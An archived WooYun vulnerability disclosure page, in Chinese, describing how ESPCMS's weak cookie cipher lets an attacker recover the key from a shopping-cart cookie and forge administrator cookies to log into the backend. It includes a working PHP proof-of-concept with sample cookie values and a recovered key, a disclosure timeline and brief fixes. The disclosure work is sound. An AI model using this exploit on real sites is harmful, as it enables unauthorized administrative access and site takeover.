@@ -1,0 +1,450 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		Espcms加密函数缺陷导致getshell  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		Espcms加密函数缺陷导致getshell  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/膜拜hym">膜拜hym</a> 
+</li><li>提交时间：		2013-08-10 09:00</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-08-10：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-08-15：	厂商主动忽略漏洞，细节向第三方安全合作伙伴开放<br/>
+									2013-11-05：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">espcms的加解密函数设计存在缺陷，可还原key并伪造cookie登陆后台getshell</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">* 程序的加解密函数存在缺陷，可以通过明文和密文逆向还原密钥<br />
+<br />
+* 后台登陆处没有有效验证cookie有效性导致攻击者可以通过伪造cookie登陆后台<br />
+<br />
+* 后台可以上传shell<br />
+<br />
+<br />
+<br />
+下面一步一步来看<br />
+<br />
+首先是加解密函数eccode<br />
+<br />
+</p><pre><code>function eccode($string, $operation = &#039;DECODE&#039;, $key = &#039;@LFK24s224%@safS3s%1f%&#039;, $mcrype = true) {<br />
+    $result = null;<br />
+    if ($operation == &#039;ENCODE&#039;) {<br />
+        for ($i = 0; $i &lt; strlen($string); $i++) {<br />
+            $char = substr($string, $i, 1);<br />
+            $keychar = substr($key, ($i % strlen($key)) - 1, 1);<br />
+            $char = chr(ord($char) + ord($keychar));<br />
+            $result.=$char;<br />
+        }<br />
+        $result = base64_encode($result);<br />
+        $result = str_replace(array(&#039;+&#039;, &#039;/&#039;, &#039;=&#039;), array(&#039;-&#039;, &#039;_&#039;, &#039;&#039;), $result);<br />
+    } elseif ($operation == &#039;DECODE&#039;) {<br />
+        $data = str_replace(array(&#039;-&#039;, &#039;_&#039;), array(&#039;+&#039;, &#039;/&#039;), $string);<br />
+        $mod4 = strlen($data) % 4;<br />
+        if ($mod4) {<br />
+            $data .= substr(&#039;====&#039;, $mod4);<br />
+        }<br />
+        $string = base64_decode($data);<br />
+        for ($i = 0; $i &lt; strlen($string); $i++) {<br />
+            $char = substr($string, $i, 1);<br />
+            $keychar = substr($key, ($i % strlen($key)) - 1, 1);<br />
+            $char = chr(ord($char) - ord($keychar));<br />
+            $result.=$char;<br />
+        }<br />
+    }<br />
+    return $result;<br />
+}</code></pre><p class='detail'><br />
+<br />
+可以看到密文是明文与key通过字符ascii相加最后base64编码后得到的，加密时，key由最后一位开始，依次与明文的每一位进行ascii相加，因此用密文和明文相减能得到key，有没有凯撒加密的感觉？<br />
+<br />
+知道原理以后下面开始逆向key：<br />
+<br />
+</p><pre><code>function anti_eccode($encrypt, $clear) {<br />
+    $result = null;<br />
+    $data = str_replace(array(&#039;-&#039;, &#039;_&#039;), array(&#039;+&#039;, &#039;/&#039;), $encrypt);<br />
+    $mod4 = strlen($data) % 4;<br />
+    if ($mod4) {<br />
+        $data .= substr(&#039;====&#039;, $mod4);<br />
+    }<br />
+<br />
+    $string = base64_decode($data);<br />
+<br />
+    for ($i = 0; $i &lt; strlen($string); $i++) {<br />
+        $char = substr($string, $i, 1);<br />
+        $keychar = substr($clear, $i, 1);<br />
+        $char = chr(ord($char) - ord($keychar));<br />
+        $result.=$char;<br />
+    }<br />
+<br />
+    $result = substr($result, 1, strlen($result) - 1).substr($result, 0, 1);<br />
+    return $result;<br />
+}</code></pre><p class='detail'><br />
+<br />
+好吧，虽然现在理论上可以还原key了，但是还得找到足够长的明文和相对应的密文才可以得到完整的key，毕竟如果明文和密文都没有key长，还原得到的key也是不完整的。<br />
+<br />
+在购物车结算时，程序会把当前物品的价格和折扣变成md5然后加密后放到cookie里，所以我们可以保证推算出最多32位长的key，够了，至于其他的地方不知道可不可以，我没有仔细看。<br />
+<br />
+</p><pre><code>function in_orderpay() {<br />
+		parent::start_pagetemplate();<br />
+<br />
+		if ($this-&gt;CON[&#039;order_ismember&#039;]) {<br />
+			parent::member_purview(0, $this-&gt;mlink[&#039;orderpay&#039;]);<br />
+		}<br />
+		$lng = (admin_LNG == &#039;big5&#039;) ? $this-&gt;CON[&#039;is_lancode&#039;] : admin_LNG;<br />
+		$cartid = $this-&gt;fun-&gt;eccode($this-&gt;fun-&gt;accept(&#039;ecisp_order_list&#039;, &#039;C&#039;), &#039;DECODE&#039;, db_pscode);<br />
+		$cartid = stripslashes(htmlspecialchars_decode($cartid));<br />
+		$uncartid = !empty($cartid) ? unserialize($cartid) : 0;<br />
+<br />
+		if ($this-&gt;CON[&#039;order_ismember&#039;]) {<br />
+<br />
+			if (!empty($this-&gt;ec_member_username_id) &amp;&amp; !empty($this-&gt;ec_member_username)) {<br />
+<br />
+				$rsMember = $this-&gt;get_member(null, $this-&gt;ec_member_username_id);<br />
+			} else {<br />
+<br />
+				$linkURL = $this-&gt;get_link(&#039;memberlogin&#039;);<br />
+				$this-&gt;callmessage($this-&gt;lng[&#039;memberloginerr&#039;], $linkURL, $this-&gt;lng[&#039;memberlogin&#039;], 1, $this-&gt;lng[&#039;member_regbotton&#039;], 1, $this-&gt;mlink[&#039;reg&#039;]);<br />
+			}<br />
+		}<br />
+<br />
+		if ($uncartid &amp;&amp; is_array($uncartid)) {<br />
+			$didarray = $this-&gt;fun-&gt;key_array_name($uncartid, &#039;did&#039;, &#039;amount&#039;, &#039;[0-9]+&#039;, &#039;[0-9]+&#039;);<br />
+			$didlist = $this-&gt;fun-&gt;format_array_text(array_keys($didarray), &#039;,&#039;);<br />
+			if (!empty($didlist)) {<br />
+				$db_table = db_prefix . &#039;document&#039;;<br />
+				$db_where = &quot;isclass=1 AND isorder=1 AND did in($didlist) ORDER BY did DESC&quot;;<br />
+				$sql = &quot;SELECT * FROM $db_table WHERE $db_where&quot;;<br />
+				$rs = $this-&gt;db-&gt;query($sql);<br />
+<br />
+				$productmoney = 0;<br />
+				while ($rsList = $this-&gt;db-&gt;fetch_assoc($rs)) {<br />
+					$amount = empty($didarray[$rsList[&#039;did&#039;]]) ? 1 : intval($didarray[$rsList[&#039;did&#039;]]);<br />
+<br />
+					$rsList[&#039;link&#039;] = $this-&gt;get_link(&#039;doc&#039;, $rsList, admin_LNG);<br />
+					$rsList[&#039;buylink&#039;] = $this-&gt;get_link(&#039;buylink&#039;, $rsList, admin_LNG);<br />
+					$rsList[&#039;enqlink&#039;] = $this-&gt;get_link(&#039;enqlink&#039;, $rsList, admin_LNG);<br />
+<br />
+					$rsList[&#039;dellink&#039;] = $this-&gt;get_link(&#039;buydel&#039;, $rsList, admin_LNG);<br />
+					$rsList[&#039;ctitle&#039;] = empty($rsList[&#039;color&#039;]) ? $rsList[&#039;title&#039;] : &quot;&lt;font color=&#039;&quot; . $rsList[&#039;color&#039;] . &quot;&#039;&gt;&quot; . $rsList[&#039;title&#039;] . &quot;&lt;/font&gt;&quot;;<br />
+					$rsList[&#039;amount&#039;] = $amount;<br />
+<br />
+					$countprice = sprintf(&quot;%01.2f&quot;, $amount * $rsList[&#039;bprice&#039;]);<br />
+					$rsList[&#039;countprice&#039;] = $countprice;<br />
+<br />
+					$productmoney = $productmoney + $countprice;<br />
+					$array[] = $rsList;<br />
+				}<br />
+<br />
+				$this-&gt;fun-&gt;setcookie(&#039;ecisp_order_productmoney&#039;, $this-&gt;fun-&gt;eccode($productmoney, &#039;ENCODE&#039;, db_pscode), 7200);<br />
+			}<br />
+<br />
+			$this-&gt;pagetemplate-&gt;assign(&#039;moneytype&#039;, $this-&gt;CON[&#039;order_moneytype&#039;]);<br />
+<br />
+			$order_discount = $this-&gt;CON[&#039;order_discount&#039;];<br />
+			$discountmoney = 0;<br />
+			if ($order_discount &gt; 0) {<br />
+<br />
+				$discountmoney = $productmoney &gt; 0 ? $productmoney - ($order_discount / 100) * $productmoney : 0;<br />
+			}<br />
+<br />
+			$discount_productmoney = $productmoney - $discountmoney;<br />
+<br />
+			$order_integral = empty($this-&gt;CON[&#039;order_integral&#039;]) ? 1 : intval($this-&gt;CON[&#039;order_integral&#039;]);<br />
+			$internum = $discount_productmoney * $order_integral;<br />
+			$this-&gt;pagetemplate-&gt;assign(&#039;internum&#039;, intval($internum));<br />
+<br />
+			$payplug = $this-&gt;get_payplug_array();<br />
+			$shipplug = $this-&gt;get_shipplug_array();<br />
+<br />
+			$cookiceprice = md5(&quot;$productmoney|$discount_productmoney&quot;);<br />
+			$this-&gt;fun-&gt;setcookie(&#039;ecisp_order_sncode&#039;, $this-&gt;fun-&gt;eccode($cookiceprice, &#039;ENCODE&#039;, db_pscode));</code></pre><p class='detail'><br />
+<br />
+而被加密的明文就是MD5过后的购物价格，因此可以还原最长32位的key<br />
+<br />
+<br />
+<br />
+在经过上面的步骤还原key以后，就可以伪造cookie登陆后台了：<br />
+<br />
+</p><pre><code>$arr_purview = explode(&#039;|&#039;, $this-&gt;fun-&gt;eccode($ecisp_admininfo, &#039;DECODE&#039;, db_pscode));<br />
+<br />
+$this-&gt;esp_powerlist = explode(&#039;|&#039;, $this-&gt;fun-&gt;eccode($esp_powerlist, &#039;DECODE&#039;, db_pscode));<br />
+<br />
+list($esp_adminuserid, $this-&gt;esp_username, $this-&gt;esp_password, $this-&gt;esp_useragent, $esp_powerid, $esp_inputclassid, $this-&gt;esp_softurl) = $arr_purview;<br />
+<br />
+$this-&gt;esp_adminuserid = intval($esp_adminuserid);<br />
+$this-&gt;esp_inputclassid = intval($esp_inputclassid);<br />
+$this-&gt;esp_powerid = intval($esp_powerid);<br />
+<br />
+if ($gettype) {<br />
+    if (empty($this-&gt;esp_username) || empty($this-&gt;esp_adminuserid) || md5(admin_AGENT) != $this-&gt;esp_useragent || md5(admin_ClassURL) != $this-&gt;esp_softurl) {<br />
+        $condition = 0;<br />
+    } else {<br />
+        $condition = 1;<br />
+    }<br />
+} else {<br />
+    if (empty($this-&gt;esp_username) || empty($this-&gt;esp_adminuserid) || md5(admin_ClassURL) != $this-&gt;esp_softurl) {<br />
+        $condition = 0;<br />
+    } else {<br />
+        $condition = 1;<br />
+    }<br />
+}<br />
+if ($condition == 0) {<br />
+<br />
+    if ($this-&gt;fun-&gt;accept(&#039;archive&#039;, &#039;R&#039;) != &#039;adminuser&#039; &amp;&amp; $this-&gt;fun-&gt;accept(&#039;action&#039;, &#039;R&#039;) != &#039;login&#039;) {<br />
+        header(&#039;location: index.php?archive=adminuser&amp;action=login&#039;);<br />
+        exit();<br />
+    }<br />
+} else {<br />
+<br />
+    if ($condition == 1 &amp;&amp; $this-&gt;fun-&gt;accept(&#039;point&#039;, &#039;R&#039;) == &#039;&#039; &amp;&amp; $this-&gt;fun-&gt;accept(&#039;archive&#039;, &#039;R&#039;) == &#039;&#039; &amp;&amp; $this-&gt;fun-&gt;accept(&#039;action&#039;, &#039;R&#039;) == &#039;&#039;) {<br />
+        header(&#039;location: index.php?archive=management&amp;action=tab&amp;loadfun=mangercenter&amp;out=tabcenter&#039;);<br />
+        exit();<br />
+    }<br />
+}</code></pre><p class='detail'><br />
+<br />
+需要cookie中的将esp_powerlist设为all，将ecisp_admininfo设为类似&#039;1|hym|12345678901234567890123456789012|&#039;.md5(&#039;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0&#039;).&#039;|1|management|&#039;.md5(&#039;http://www.evil.com/espcms/adminsoft&#039;这样的结构，去登陆后台就可以了，此处应有掌声。<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">首先注册会员购物<br />
+<br />
+</p><p class="detail"><a href="../images/100149559886b8704a07e0c0ed3d88340890be70.jpg" target="_blank"><img src="../images/100149559886b8704a07e0c0ed3d88340890be70.jpg" alt="1.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+折扣前和折扣后的价格都是3200，所以明文是<br />
+<br />
+md5(&#039;3200|3200&#039;)=&#039;38a7a5650e6296b180c88f6592486fbf&#039;<br />
+<br />
+密文通过查看cookie中的ecisp_order_sncode得到：<br />
+<br />
+ecisp_order_sncode=mHGWbpJsapiRnZhjbG6WlWtnlpxqzG6XbWlsa5ufl50<br />
+<br />
+写了一个poc来还原key：<br />
+<br />
+</p><pre><code>&lt;?php<br />
+function anti_eccode($encrypt, $clear) {<br />
+    $result = null;<br />
+    $data = str_replace(array(&#039;-&#039;, &#039;_&#039;), array(&#039;+&#039;, &#039;/&#039;), $encrypt);<br />
+    $mod4 = strlen($data) % 4;<br />
+    if ($mod4) {<br />
+        $data .= substr(&#039;====&#039;, $mod4);<br />
+    }<br />
+<br />
+    $string = base64_decode($data);<br />
+<br />
+    for ($i = 0; $i &lt; strlen($string); $i++) {<br />
+        $char = substr($string, $i, 1);<br />
+        $keychar = substr($clear, $i, 1);<br />
+        $char = chr(ord($char) - ord($keychar));<br />
+        $result.=$char;<br />
+    }<br />
+<br />
+    $result = substr($result, 1, strlen($result) - 1).substr($result, 0, 1);<br />
+    return $result;<br />
+}<br />
+<br />
+function eccode($string, $operation = &#039;DECODE&#039;, $key = &#039;@LFK24s224%@safS3s%1f%&#039;, $mcrype = true) {<br />
+    $result = null;<br />
+    if ($operation == &#039;ENCODE&#039;) {<br />
+        for ($i = 0; $i &lt; strlen($string); $i++) {<br />
+            $char = substr($string, $i, 1);<br />
+            $keychar = substr($key, ($i % strlen($key)) - 1, 1);<br />
+            $char = chr(ord($char) + ord($keychar));<br />
+            $result.=$char;<br />
+        }<br />
+        $result = base64_encode($result);<br />
+        $result = str_replace(array(&#039;+&#039;, &#039;/&#039;, &#039;=&#039;), array(&#039;-&#039;, &#039;_&#039;, &#039;&#039;), $result);<br />
+    } elseif ($operation == &#039;DECODE&#039;) {<br />
+        $data = str_replace(array(&#039;-&#039;, &#039;_&#039;), array(&#039;+&#039;, &#039;/&#039;), $string);<br />
+        $mod4 = strlen($data) % 4;<br />
+        if ($mod4) {<br />
+            $data .= substr(&#039;====&#039;, $mod4);<br />
+        }<br />
+        $string = base64_decode($data);<br />
+        for ($i = 0; $i &lt; strlen($string); $i++) {<br />
+            $char = substr($string, $i, 1);<br />
+            $keychar = substr($key, ($i % strlen($key)) - 1, 1);<br />
+            $char = chr(ord($char) - ord($keychar));<br />
+            $result.=$char;<br />
+        }<br />
+    }<br />
+    return $result;<br />
+}<br />
+<br />
+#明文<br />
+$clear =    &quot;38a7a5650e6296b180c88f6592486fbf&quot;;<br />
+#密文<br />
+$encrypt =  &quot;mHGWbpJsapiRnZhjbG6WlWtnlpxqzG6XbWlsa5ufl50&quot;;<br />
+<br />
+#获取key<br />
+$mkey = anti_eccode($encrypt, $clear);<br />
+<br />
+print &quot;[*]maybe key is:&quot;.$mkey.&quot;\n&quot;;<br />
+#使用者自己根据判断裁剪mkey的长度获取真实的key<br />
+print &quot;[*]input key:&quot;;<br />
+<br />
+$key = trim(fgets(STDIN));<br />
+<br />
+#构造cookie<br />
+$esp_powerlist = eccode(&#039;all&#039;, &#039;ENCODE&#039;, $key);<br />
+$ecisp_admininfo = eccode(&#039;1|hym|12345678901234567890123456789012|&#039;.md5(&#039;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0&#039;).&#039;|1|management|&#039;.md5(&#039;http://www.evil.com/espcms/adminsoft&#039;), &#039;ENCODE&#039;, $key);<br />
+<br />
+print &quot;[+]esp_powerlist=$esp_powerlist\n&quot;;<br />
+print &quot;[+]ecisp_admininfo=$ecisp_admininfo\n&quot;;<br />
+<br />
+?&gt;</code></pre><p class='detail'><br />
+<br />
+</p><p class="detail"><a href="../images/1001563653befce4cadf77a0575826c0737d74c8.jpg" target="_blank"><img src="../images/1001563653befce4cadf77a0575826c0737d74c8.jpg" alt="getkey.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+通过检查，发现后面实际是重复的，因此真正的key应该是前面的957174ca8b1384d373d2f8b4783e<br />
+<br />
+key正是&quot;957174ca8b1384d373d2f8b4783e&quot;<br />
+<br />
+然后设置cookie并登陆，浏览器要与poc中设置的浏览器一致，否则会登陆失败<br />
+<br />
+</p><p class="detail"><a href="../images/100159464ddb892df21f44f87f9d0209dbc767e0.jpg" target="_blank"><img src="../images/100159464ddb892df21f44f87f9d0209dbc767e0.jpg" alt="setcookie.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/100211536949218ba0d6642124985427934ff9f2.jpg" target="_blank"><img src="../images/100211536949218ba0d6642124985427934ff9f2.jpg" alt="admin.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+进入后台后getshell的方法有很多，就不说了。 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">1.加解密函数的算法强度要增强<br />
+<br />
+2.后台cookie验证处需加强 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/膜拜hym" title="膜拜hym">膜拜hym</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-034014" title="Espcms加密函数缺陷导致getshell">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：无影响厂商忽略</p>
+													<p class="detail">忽略时间：2013-08-15 09:01</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail"></p>
+											
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="34014";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
